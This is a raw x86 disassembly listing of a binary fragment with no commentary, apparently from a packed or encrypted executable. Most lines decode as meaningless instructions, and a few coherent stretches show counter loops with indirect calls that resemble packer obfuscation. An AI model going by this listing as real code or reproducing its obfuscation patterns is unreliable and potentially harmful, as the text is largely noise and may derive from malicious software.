  4073f3:	int    0x6d
  4073f5:	push   ebp
  4073f6:	test   BYTE PTR [ecx-0x30e4218f],cl
  4073fc:	mov    edx,0x4c69274f
  407401:	test   BYTE PTR [eax],dh
  407403:	hlt    
  407404:	xor    cl,BYTE PTR [edx]
  407406:	test   edi,0x4af2fc0
  40740c:	xchg   esi,eax
  40740d:	add    BYTE PTR [edx+0x69619a8],dh
  407413:	shl    BYTE PTR [ecx],1
  407415:	xor    DWORD PTR [esi+0x14],esi
  407418:	call   0x9d63:0xc3ae4a72
  40741f:	push   cs
  407420:	aaa    
  407421:	jl     0x407456
  407423:	nop
  407424:	add    bh,BYTE PTR [edi+0x7c83adad]
  40742a:	or     BYTE PTR [esi],ah
  40742c:	call   0xe351:0x8c41ba2a
  407433:	addr16 popf 
  407435:	sub    ah,BYTE PTR [edx]
  407437:	mov    edi,0xa05b20ee
  40743c:	inc    ebp
  40743d:	call   0x6c82:0x3a22af34
  407444:	fbstp  TBYTE PTR [ebx]
  407446:	ror    BYTE PTR [ebx+0xd81f07d],1
  40744c:	xlat   BYTE PTR ds:[ebx]
  40744d:	add    al,0x43
  40744f:	add    BYTE PTR [ebp+0x3000071],ah
  407455:	rol    edi,1
  407457:	add    eax,0x430449
  40745c:	dec    ecx
  40745d:	pop    edx
  40745e:	add    BYTE PTR [eax],al
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x4304cf,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     BYTE PTR [ecx+edx*1],dh
  40747f:	sbb    eax,ecx
  407481:	xor    eax,0x8a7e7ec5
  407486:	jg     0x407506
  407488:	jle    0x40746d
  40748a:	and    al,0xa2
  40748c:	into   
  40748d:	outs   dx,DWORD PTR ds:[esi]
  40748e:	call   0xc26f2777
  407493:	jmp    0xdcfc3517
  407498:	jmp    0x407461
  40749a:	jo     0x407420
  40749c:	pop    esi
  40749d:	dec    ecx
  40749e:	rsqrtps xmm3,XMMWORD PTR [ecx-0x6f]
  4074a2:	das    
  4074a3:	push   cs
  4074a4:	sub    DWORD PTR [edi+0x1b],0x3
  4074a8:	rcr    dh,0x7f
  4074ab:	shr    DWORD PTR cs:[ecx+0x6a316b55],cl
  4074b2:	push   ds
  4074b3:	leave  
  4074b4:	push   cs
  4074b5:	cmp    dl,dh
  4074b7:	sub    al,0x87
  4074b9:	sub    DWORD PTR [edi+eiz*8+0x5f],0xd7175fce
  4074c1:	xchg   ecx,eax
  4074c2:	jb     0x407524
  4074c4:	mov    ebx,0x7830ed17
  4074c9:	mov    dh,0x6b
  4074cb:	mov    al,0xab
  4074cd:	js     0x407484
  4074cf:	stos   DWORD PTR es:[edi],eax
  4074d0:	pop    ss
  4074d1:	shl    BYTE PTR [ebx],1
  4074d3:	scas   eax,DWORD PTR es:[edi]
  4074d4:	gs jo  0x407464
  4074d7:	js     0x407502
  4074d9:	inc    eax
  4074da:	adc    bl,al
  4074dc:	call   0xc7e5:0x25cd408f
  4074e3:	loope  0x40747f
  4074e5:	setl   BYTE PTR [ecx+0x1a12f0cb]
  4074ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074ed:	ja     0x4074ab
  4074ef:	inc    esp
  4074f0:	das    
  4074f1:	lea    ebp,ds:0xbbe3ecbf
  4074f7:	std    
  4074f8:	ud0    esi,DWORD PTR [edi+0x686268d5]
  4074ff:	leave  
  407500:	ins    DWORD PTR es:[edi],dx
  407501:	adc    WORD PTR [ebx],bx
  407504:	push   ecx
  407505:	into   
  407506:	fst    QWORD PTR [ebx+0x33]
  407509:	jno    0x40748f
  40750b:	in     al,0x6d
  40750d:	cmp    ecx,eax
  40750f:	inc    ebp
  407510:	mov    esi,0x62b7256d
  407515:	mov    cl,0x3
  407517:	cmovp  ebx,ebx
  40751a:	in     eax,dx
  40751b:	loope  0x407585
  40751d:	sbb    DWORD PTR [esi],eax
  40751f:	mov    ds:0xa25638f1,al
  407524:	test   eax,esi
  407526:	in     al,dx
  407527:	and    al,0xea
  407529:	and    DWORD PTR [esi+0x66],eax
  40752c:	jb     0x4074e3
  40752e:	and    DWORD PTR [esi-0x52],esi
  407531:	xchg   ebp,eax
  407532:	pop    ebx
  407533:	cli    
  407534:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407535:	jbe    0x407542
  407537:	mov    ebp,0x7f332f54
  40753c:	or     ecx,DWORD PTR [edi-0x2cfa247]
  407542:	(bad)  
  407543:	test   edi,0x51b55b3
  407549:	sti    
  40754a:	dec    esp
  40754b:	repz jl 0x40750b
  40754e:	enter  0x23ea,0x60
  407552:	dec    ecx
  407553:	ror    bh,cl
  407555:	xor    esp,edx
  407557:	push   edx
  407558:	iret   
  407559:	jecxz  0x4074e7
  40755b:	call   0x3f6d59c3
  407560:	scas   al,BYTE PTR es:[edi]
  407561:	sub    dh,ch
  407563:	inc    edi
  407564:	xchg   edx,eax
  407565:	cmp    DWORD PTR [ebp+0x74503182],0x3619a1eb
  40756f:	sbb    eax,0x6445ad08
  407574:	cmp    BYTE PTR [ecx+0x55],dl
  407577:	outs   dx,BYTE PTR ds:[esi]
  407578:	bound  edi,QWORD PTR [edi-0x6a]
  40757b:	int3   
  40757c:	data16 and al,0xd2
  40757f:	mov    esp,0x46479649
  407584:	cli    
  407585:	por    mm5,QWORD PTR [ecx+0x69]
  407589:	hlt    
  40758a:	rol    DWORD PTR [ebp+ebp*1+0x7c0bb9bf],1
  407591:	mov    al,ds:0x54245df
  407596:	or     BYTE PTR [eax],dh
  407598:	loope  0x40758e
  40759a:	cmc    
  40759b:	or     ebp,DWORD PTR [edx]
  40759d:	mov    dl,0x13
  40759f:	shr    cl,1
  4075a1:	lahf   
  4075a2:	test   eax,0xfe4b5194
  4075a7:	jns    0x4075d8
  4075a9:	popa   
  4075aa:	test   DWORD PTR [ecx-0x2a10ad61],0x8befa589
  4075b4:	shr    DWORD PTR [ecx-0x3ebff549],0xe2
  4075bb:	pop    ebx
  4075bc:	enter  0x7d9e,0x89
  4075c0:	retf   
  4075c1:	cdq    
  4075c2:	lahf   
  4075c3:	cmp    bl,BYTE PTR [eax]
  4075c5:	mov    edx,0x96358f6b
  4075ca:	outs   dx,DWORD PTR ds:[esi]
  4075cb:	push   edx
  4075cc:	gs jecxz 0x407566
  4075cf:	mov    eax,DWORD PTR [esi]
  4075d1:	shl    BYTE PTR [edx+0x2379fe4],1
  4075d7:	inc    dx
  4075d9:	or     bl,BYTE PTR es:[esi+0x43b09800]
  4075e0:	aad    0x5
  4075e2:	mul    DWORD PTR gs:[edi]
  4075e5:	push   cs
  4075e6:	cmc    
  4075e7:	mov    bl,0xa2
  4075e9:	push   edi
  4075ea:	cs dec ebx
  4075ec:	mov    al,0x52
  4075ee:	retfw  
  4075f0:	jle    0x407605
  4075f2:	sbb    edx,DWORD PTR [edi]
  4075f4:	sbb    al,0xd5
  4075f6:	or     bh,BYTE PTR [ebp-0x4f02a585]
  4075fc:	(bad)  
  4075fd:	push   ss
  4075fe:	mov    ah,0x7c
  407600:	fdivrp st(0),st
  407602:	stos   BYTE PTR es:[edi],al
  407603:	xor    DWORD PTR [ecx-0x6a84300],ecx
  407609:	ins    DWORD PTR es:[edi],dx
  40760a:	dec    ebp
  40760b:	sub    eax,0xd613bbf9
  407610:	popf   
  407611:	lods   eax,DWORD PTR ds:[esi]
  407612:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407613:	nop    DWORD PTR [eax+0x19]
  407617:	or     DWORD PTR [edx*1+0xf2f57c9],ecx
  40761e:	test   bl,ch
  407620:	sbb    al,BYTE PTR [eax]
  407622:	add    BYTE PTR [ebx-0x17],dl
  407625:	pop    esi
  407626:	pop    ss
  407627:	add    BYTE PTR [eax],al
  407629:	and    DWORD PTR ds:0x42edcb,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42edcb
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42edcb,edx
  407647:	cmp    DWORD PTR ds:0x42edcb,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42edcb,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42eab3
  40766a:	cmp    DWORD PTR ds:0x42edcb,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42edcb
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42edcb,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	fistp  DWORD PTR ds:0xc24115da
  4076aa:	jle    0x40772a
  4076ac:	mov    bh,BYTE PTR [edi+0x7e]
  4076af:	jle    0x4076a0
  4076b1:	jnp    0x407644
  4076b3:	cmp    eax,0x7bf2058e
  4076b8:	mov    ebx,0x3af88c8c
  4076bd:	push   0xb40c5933
  4076c2:	lahf   
  4076c3:	dec    ecx
  4076c4:	push   esi
  4076c5:	shl    DWORD PTR [esi+0xa2f93f3],1
  4076cb:	ins    BYTE PTR es:[edi],dx
  4076cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076cd:	push   eax
  4076ce:	mov    eax,0xd6f82589
  4076d3:	imul   ebx,DWORD PTR [edx],0xffffff81
  4076d6:	das    
  4076d7:	retf   
  4076d8:	fwait
  4076d9:	loop   0x4076ce
  4076db:	popa   
  4076dc:	mov    ch,0x12
  4076de:	sub    al,0xd3
  4076e0:	mov    ecx,0x4cbcee3d
  4076e5:	ret    
  4076e6:	test   al,0x8f
  4076e8:	dec    ebp
  4076e9:	inc    esp
  4076ea:	mov    bl,0x39
  4076ec:	sub    esi,DWORD PTR [ecx+0x51]
  4076ef:	pop    edx
  4076f0:	dec    edi
  4076f1:	sahf   
  4076f2:	in     al,0xea
  4076f4:	xor    eax,0xee1d14bd
  4076f9:	call   0x15071dd5
  4076fe:	jbe    0x407737
  407700:	in     eax,dx
  407701:	sbb    BYTE PTR [ecx-0x62],bh
  407704:	leave  
  407705:	loope  0x4076b0
  407707:	lahf   
  407708:	cmc    
  407709:	jmp    0x7f85705a
  40770e:	inc    ebx
  40770f:	mov    BYTE PTR [edi-0x30d6c987],dl
  407715:	push   ss
  407716:	loope  0x4076e0
  407718:	mov    dh,0x44
  40771a:	in     eax,0x9c
  40771c:	dec    eax
  40771d:	adc    eax,DWORD PTR [edi-0x65]
  407720:	adc    BYTE PTR [edx+esi*1],dh
  407723:	mov    cl,0x41
  407725:	cmc    
  407726:	ror    DWORD PTR [eax+0x3fbaf4c3],cl
  40772c:	pop    ebx
  40772d:	iret   
  40772e:	adc    al,0xdb
  407730:	das    
  407731:	dec    eax
  407732:	xor    al,0xc7
  407734:	ins    BYTE PTR es:[edi],dx
  407735:	imul   ebx,DWORD PTR [ebx+0x7f],0xffffff87
  407739:	lahf   
  40773a:	jnp    0x4076c1
  40773c:	leave  
  40773d:	push   ds
  40773e:	out    0xfd,al
  407740:	pop    ds
  407741:	jnp    0x4076f5
  407743:	loopne 0x407788
  407745:	sbb    eax,0x97a6cb23
  40774a:	dec    edx
  40774b:	push   ecx
  40774c:	out    0xa8,al
  40774e:	dec    edx
  40774f:	sbb    esi,ebx
  407751:	shl    DWORD PTR [ecx+0x200934b3],0x87
  407758:	ins    BYTE PTR es:[edi],dx
  407759:	pushf  
  40775a:	mov    cl,0x1a
  40775c:	inc    esi
  40775d:	add    eax,0xb9d3236b
  407762:	fxch   st(4)
  407765:	(bad)  
  407766:	test   BYTE PTR [edi-0x48],dl
  407769:	dec    ecx
  40776a:	out    0x46,al
  40776c:	jae    0x40770b
  40776e:	pop    ds
  40776f:	daa    
  407770:	out    dx,eax
  407771:	dec    ebx
  407772:	add    DWORD PTR [eax+esi*4],0x35
  407776:	frstor [ebx]
  407778:	fs in  al,dx
  40777a:	inc    edx
  40777b:	adc    al,0xd2
  40777d:	adc    ecx,DWORD PTR ds:0x16e16d23
  407783:	mov    edi,0xe412a5c9
  407788:	imul   ebx,eax,0x13a3fd8c
  40778e:	fnsave [ebx]
  407790:	mov    WORD PTR [esi+ebx*8-0x33],cs
  407794:	add    eax,0x139c07d1
  407799:	lea    ebx,[esi-0x19]
  40779c:	shl    BYTE PTR [ecx+0x34],cl
  40779f:	rcl    BYTE PTR [ebp+0x544f09d2],1
  4077a5:	rol    BYTE PTR [edx+0x68],0x2f
  4077a9:	mov    ch,0xcf
  4077ab:	cmc    
  4077ac:	cmp    BYTE PTR [ecx+ebp*2],ch
  4077af:	mov    ebp,0x48666449
  4077b4:	xor    al,0xd3
  4077b6:	sub    eax,0x1ca6b811
  4077bb:	or     al,BYTE PTR ss:[eax+0x38a9c116]
  4077c2:	xchg   BYTE PTR [esp+ecx*2],dl
  4077c5:	or     eax,0x7aaf9bfd
  4077ca:	shl    edi,1
  4077cc:	daa    
  4077cd:	mov    edi,0x8802ee37
  4077d2:	fdiv   DWORD PTR [esi]
  4077d4:	stc    
  4077d5:	iret   
  4077d6:	push   es
  4077d7:	arpl   WORD PTR [ecx*1-0x68b114ce],dx
  4077de:	push   0x7298f93
  4077e3:	(bad)  
  4077e4:	ror    BYTE PTR [ebx+0x76],1
  4077e7:	inc    ebx
  4077e8:	repnz cmp ch,BYTE PTR [ebp*4-0x58ef6ad8]
  4077f0:	adc    ebp,DWORD PTR [ebp-0x3d95abe9]
  4077f6:	mov    ds:0xfb298b9d,al
  4077fb:	retf   0x5e82
  4077fe:	(bad)  
  407800:	and    edx,DWORD PTR [esi+0x2ae61a]
  407806:	lods   al,BYTE PTR ds:[esi]
  407807:	ss into 
  407809:	jl     0x40783c
  40780b:	mov    ebp,ebp
  40780d:	cmp    ch,BYTE PTR [edi-0x34269023]
  407813:	mov    al,0x78
  407815:	aas    
  407816:	inc    edx
  407817:	lea    ebp,[edx+0x17cb75fb]
  40781d:	and    cl,BYTE PTR [ebx-0x24]
  407820:	iret   
  407821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407822:	pop    es
  407823:	cmp    BYTE PTR [ebp+0x14],bl
  407826:	stos   BYTE PTR es:[edi],al
  407827:	add    dh,BYTE PTR [ecx]
  407829:	cmc    
  40782a:	inc    esp
  40782b:	pop    ds
  40782c:	dec    ebp
  40782d:	xchg   ebx,eax
  40782e:	stos   DWORD PTR es:[edi],eax
  40782f:	fs into 
  407831:	jne    0x4077ca
  407833:	adc    BYTE PTR [edi-0x64],dl
  407836:	and    cl,BYTE PTR [ebx-0x1b]
  407839:	sbb    ecx,DWORD PTR [ecx]
  40783b:	jmp    0x407813
  40783d:	push   edi
  40783e:	out    dx,eax
  40783f:	inc    ebp
  407840:	xor    BYTE PTR [ecx+0x558b0ebc],dh
  407846:	cld    
  407847:	adc    DWORD PTR ds:0x430449,0x4304cf
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x43046d,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e7c4,0x1e
  407871:	cmp    DWORD PTR ds:0x42e7c4,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e7c4,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42eab7
  407896:	mov    edi,DWORD PTR ds:0x42e7c4
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e7c4,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42edcf
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x43043d,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x43043d
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x43043d,ebx
  4078d6:	cmp    DWORD PTR ds:0x43043d,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42ec27
  4078f1:	cmp    DWORD PTR ds:0x43043d,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	(bad)  
  407942:	cld    
  407943:	test   DWORD PTR [edi-0x66],0x7e7ec0dd
  40794a:	mov    bh,BYTE PTR [edi+0x7e]
  40794d:	jle    0x4079ae
  40794f:	xor    al,0xb9
  407951:	mov    ebp,0x46c71f23
  407956:	sbb    al,0xac
  407958:	xchg   BYTE PTR [ecx],bh
  40795a:	imul   ebx,edi,0xffffffc8
  40795d:	adc    BYTE PTR [ecx-0x29],0x34
  407961:	adc    ebp,0xa6e0d65c
  407967:	ss inc edi
  407969:	les    eax,FWORD PTR ds:0xabc9392
  40796f:	test   eax,0xa35d5da7
  407974:	stos   DWORD PTR es:[edi],eax
  407975:	sti    
  407976:	xor    ch,BYTE PTR [edx]
  407978:	mov    ds:0x162b3502,eax
  40797d:	scas   al,BYTE PTR es:[edi]
  40797e:	loope  0x40795c
  407980:	sub    eax,0x365bb9be
  407985:	mov    ebx,0xf640f6f3
  40798a:	inc    esp
  40798b:	js     0x4079db
  40798d:	aam    0x16
  40798f:	and    al,0x74
  407991:	xchg   ecx,eax
  407992:	and    esi,esp
  407994:	mov    cl,0xa
  407996:	rcl    BYTE PTR [edx-0xb34299a],cl
  40799c:	add    eax,0x250ce321
  4079a1:	sbb    BYTE PTR [ecx-0x6782d3d4],ch
  4079a7:	dec    edi
  4079a8:	sub    bh,BYTE PTR [ecx-0x6a]
  4079ab:	call   0x7c25:0x527cc5ff
  4079b2:	push   ebp
  4079b3:	xor    al,0xfd
  4079b5:	pop    ecx
  4079b6:	push   ebx
  4079b7:	xchg   ebp,eax
  4079b8:	add    al,0x7d
  4079bb:	xchg   edi,eax
  4079bc:	pop    ebx
  4079bd:	out    0x1c,al
  4079bf:	out    dx,eax
  4079c0:	jnp    0x407982
  4079c2:	and    BYTE PTR [eax-0x6faab253],0xc2
  4079c9:	add    BYTE PTR [ecx-0x24658946],ah
  4079cf:	add    eax,0xbc51ddff
  4079d4:	mul    ebx
  4079d6:	aam    0x23
  4079d8:	test   DWORD PTR [ebp-0x5f],ebp
  4079db:	sub    ebp,0xb7b350ad
  4079e1:	lahf   
  4079e2:	sbb    ah,BYTE PTR [ebx-0x5c8ce56f]
  4079e8:	adc    al,0xd5
  4079ea:	push   ds
  4079eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079ec:	ds jne 0x407a44
  4079ef:	std    
  4079f0:	xor    bl,al
  4079f2:	push   ss
  4079f3:	mov    dl,0x45
  4079f5:	xchg   esi,eax
  4079f6:	push   ebx
  4079f7:	sti    
  4079f8:	or     BYTE PTR [edi-0xe],dl
  4079fb:	inc    eax
  4079fc:	test   DWORD PTR [edi],0x923f771e
  407a02:	iret   
  407a03:	jp     0x407992
  407a05:	mov    ebx,0xa7278332
  407a0a:	test   eax,0xad372a04
  407a0f:	das    
  407a10:	rcl    BYTE PTR [esi],cl
  407a12:	call   0x8ec77c3f
  407a17:	xor    eax,0xd65a6328
  407a1c:	inc    ebx
  407a1d:	mov    dh,0xe5
  407a1f:	pop    ds
  407a20:	fnstenv [esi]
  407a22:	popa   
  407a23:	test   al,0xde
  407a25:	idiv   BYTE PTR [edi+ebx*8]
  407a28:	mov    cl,0x13
  407a2a:	mov    ebx,0x66d06f40
  407a2f:	mov    eax,0xc856284e
  407a34:	jecxz  0x4079bf
  407a36:	gs test edx,esi
  407a39:	test   al,0x57
  407a3b:	repnz test DWORD PTR [ebx-0x56],0x3220b1e8
  407a43:	sbb    esi,DWORD PTR [eax]
  407a45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a46:	mov    edx,ebp
  407a48:	js     0x407a32
  407a4a:	xchg   esp,eax
  407a4b:	and    dl,bl
  407a4d:	shl    DWORD PTR [ecx-0x7a],cl
  407a50:	mul    DWORD PTR [eax+0x17a9f34]
  407a56:	add    bl,BYTE PTR [ecx-0x11]
  407a59:	jno    0x407ab2
  407a5b:	clc    
  407a5c:	cli    
  407a5d:	scas   al,BYTE PTR es:[edi]
  407a5e:	clc    
  407a5f:	cmp    edi,DWORD PTR [ebx-0x48bccd68]
  407a65:	xchg   esp,eax
  407a66:	push   edi
  407a67:	cmp    eax,0x1d10401
  407a6c:	mov    DWORD PTR [edx-0x163ca719],ecx
  407a72:	sar    BYTE PTR [ebx-0x58],cl
  407a75:	pop    es
  407a76:	sub    BYTE PTR [edi+0x0],al
  407a79:	loope  0x407aee
  407a7b:	iret   
  407a7c:	sbb    al,0x39
  407a7e:	aas    
  407a7f:	cmp    BYTE PTR [ebx],ch
  407a81:	es (bad) 
  407a85:	(bad)  [edi+esi*4]
  407a88:	and    BYTE PTR [edi+eiz*4-0x7b],ch
  407a8c:	dec    edx
  407a8d:	cld    
  407a8e:	sahf   
  407a8f:	lods   eax,DWORD PTR ds:[esi]
  407a90:	and    al,0x14
  407a92:	fs push ebp
  407a94:	mov    dl,0x9
  407a96:	pop    eax
  407a97:	push   eax
  407a98:	cmp    eax,0xb2a54fcd
  407a9d:	push   ss
  407a9e:	ret    
  407a9f:	adc    edi,DWORD PTR es:[edi-0x4a]
  407aa3:	into   
  407aa4:	arpl   WORD PTR [esi+0x3bf5b75b],bp
  407aaa:	push   ds
  407aab:	enter  0xe934,0xb9
  407aaf:	gs xchg ecx,eax
  407ab1:	sbb    al,0x9e
  407ab4:	push   ecx
  407ab5:	mov    edx,DWORD PTR [ebp-0x60]
  407ab8:	push   0xffffff9d
  407aba:	shr    DWORD PTR [edi],1
  407abc:	mov    al,ds:0x5361bc99
  407ac1:	leave  
  407ac2:	jmp    0x9f88:0x23e4bf66
  407ac9:	jmp    0x75c197d
  407ace:	rol    esi,1
  407ad0:	xor    BYTE PTR [ecx+ecx*1],bl
  407ad3:	xchg   BYTE PTR ds:0x9ee4b527,cl
  407ad9:	sti    
  407ada:	mov    ebp,0x968b5eba
  407adf:	sbb    eax,0x5d8b2474
  407ae4:	lock sub ebx,edi
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi-0xf5b3436]
  407b11:	icebp  
  407b12:	imul   eax,ecx,0x7f8a7e7e
  407b18:	jle    0x407b98
  407b1a:	or     BYTE PTR [ecx],0xfb
  407b1d:	call   FWORD PTR [ebx]
  407b1f:	mov    BYTE PTR [esi],bl
  407b21:	cld    
  407b22:	mov    dl,0xaa
  407b24:	cwde   
  407b25:	aaa    
  407b26:	sbb    DWORD PTR [ebx+0xb],eax
  407b29:	jl     0x407b3e
  407b2b:	ins    BYTE PTR es:[edi],dx
  407b2c:	add    al,bh
  407b2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b2f:	push   edi
  407b30:	mov    ecx,0x1171b696
  407b35:	sbb    ebx,DWORD PTR [ecx+0x2c]
  407b38:	or     dl,BYTE PTR [ebp-0x5f4b08c8]
  407b3e:	addr16 push esp
  407b40:	sub    BYTE PTR [edx+0x3383eaff],ah
  407b46:	addr16 data16 sbb al,0xf8
  407b4a:	sbb    eax,0x5486273
  407b4f:	stos   BYTE PTR es:[edi],al
  407b50:	sbb    al,BYTE PTR [ecx+ecx*2+0x1f39ee80]
  407b57:	test   dh,bh
  407b59:	mov    bl,BYTE PTR [eax+0x4f9722c7]
  407b5f:	mov    DWORD PTR [edx+0x5e283913],ecx
  407b65:	loop   0x407b09
  407b67:	jecxz  0x407b08
  407b69:	push   eax
  407b6a:	jmp    0x407b83
  407b6c:	pop    es
  407b6d:	add    ebp,eax
  407b6f:	xor    esi,DWORD PTR [ecx]
  407b71:	pop    ds
  407b72:	lock cmp al,BYTE PTR [esp+0x55]
  407b77:	rcr    DWORD PTR [esi],cl
  407b79:	inc    edx
  407b7a:	fucomp st(4)
  407b7c:	les    edi,FWORD PTR [esi-0x1c493934]
  407b82:	into   
  407b83:	je     0x407c01
  407b85:	mov    ch,0x5e
  407b87:	jno    0x407ba8
  407b89:	or     eax,0x81542f68
  407b8e:	addr16 pop edx
  407b90:	sti    
  407b91:	or     BYTE PTR [ecx-0x43],dh
  407b94:	or     al,0x2b
  407b96:	pop    edi
  407b97:	lds    esp,FWORD PTR ds:0x4cd740f2
  407b9d:	nop
  407b9e:	inc    esp
  407b9f:	lds    eax,FWORD PTR [edx+0xd]
  407ba2:	(bad)  [edx]
  407ba4:	xor    bh,bh
  407ba6:	xchg   ebp,eax
  407ba7:	mov    al,0x8d
  407ba9:	jo     0x407bb4
  407bab:	push   edi
  407bac:	stc    
  407bad:	xchg   esp,eax
  407bae:	cdq    
  407baf:	mov    cl,0x31
  407bb1:	push   ebp
  407bb2:	fwait
  407bb3:	dec    ebp
  407bb4:	adc    al,0x1a
  407bb6:	jne    0x407c18
  407bb8:	popf   
  407bb9:	push   ebx
  407bba:	sbb    BYTE PTR [esi+0x16],bh
  407bbd:	xor    BYTE PTR [edx+0x6d],0x4
  407bc1:	gs mov al,0xeb
  407bc4:	push   0xad1b8431
  407bc9:	mov    eax,ds:0x9eb87b78
  407bce:	cs out 0xa3,al
  407bd1:	push   es
  407bd2:	adc    BYTE PTR [eax-0x79],dh
  407bd5:	loop   0x407c06
  407bd7:	xchg   ebp,eax
  407bd8:	mov    cs,WORD PTR [ecx+0xf53aabb]
  407bde:	mov    ?,WORD PTR [eax]
  407be0:	mov    bl,0x60
  407be2:	(bad)  
  407be3:	cdq    
  407be4:	call   0xf50da42a
  407be9:	adc    al,0x7a
  407beb:	xchg   ebx,eax
  407bec:	in     al,0x6e
  407bee:	into   
  407bef:	pop    edi
  407bf0:	fwait
  407bf1:	int    0x57
  407bf3:	and    eax,0x33e42e6f
  407bf8:	fild   WORD PTR [eax-0x3e3c59b4]
  407bfe:	mov    ds:0xdeba7cb4,al
  407c03:	lds    esp,FWORD PTR [eax]
  407c05:	jne    0x407c4b
  407c07:	inc    ebp
  407c08:	jnp    0x407bb0
  407c0a:	mov    ecx,0x21c72d8e
  407c0f:	pop    edx
  407c10:	or     BYTE PTR [eax+0x21],bh
  407c13:	mov    db0,esi
  407c16:	popf   
  407c17:	xor    edx,ebp
  407c19:	je     0x407c76
  407c1b:	jo     0x407c35
  407c1d:	sub    edx,DWORD PTR [eax-0x40]
  407c20:	inc    edx
  407c21:	sub    ebp,DWORD PTR [ecx]
  407c23:	bound  eax,QWORD PTR [eax]
  407c25:	cwde   
  407c26:	inc    eax
  407c27:	sub    al,bl
  407c29:	std    
  407c2a:	(bad)  
  407c2b:	adc    DWORD PTR [edi-0x2],ecx
  407c2e:	add    BYTE PTR [eax],dh
  407c30:	push   ecx
  407c31:	xchg   ebx,eax
  407c32:	sbb    edi,DWORD PTR [esp+eiz*8]
  407c35:	aas    
  407c36:	mov    cl,0xc6
  407c38:	test   eax,0x6b36d742
  407c3d:	inc    edx
  407c3e:	jecxz  0x407c06
  407c40:	bound  esi,QWORD PTR [edi+ebp*1]
  407c43:	es add al,0xbd
  407c46:	lods   al,BYTE PTR ds:[esi]
  407c47:	cwde   
  407c48:	add    bh,BYTE PTR es:[ebp+0x2a]
  407c4c:	stos   BYTE PTR es:[edi],al
  407c4d:	aas    
  407c4e:	inc    esp
  407c4f:	lea    eax,[eax+0x2c3e3ba4]
  407c55:	adc    eax,DWORD PTR [eax-0x47]
  407c58:	fs test eax,0xa70640d9
  407c5e:	push   edi
  407c5f:	sub    eax,0x68ce0f8e
  407c64:	dec    ecx
  407c65:	pop    ebx
  407c66:	out    0xf0,eax
  407c68:	push   ebx
  407c69:	xchg   edx,eax
  407c6a:	cmc    
  407c6b:	and    eax,0x168400d6
  407c70:	ds iret 
  407c72:	mov    ch,0x70
  407c74:	jb     0x407cad
  407c76:	aas    
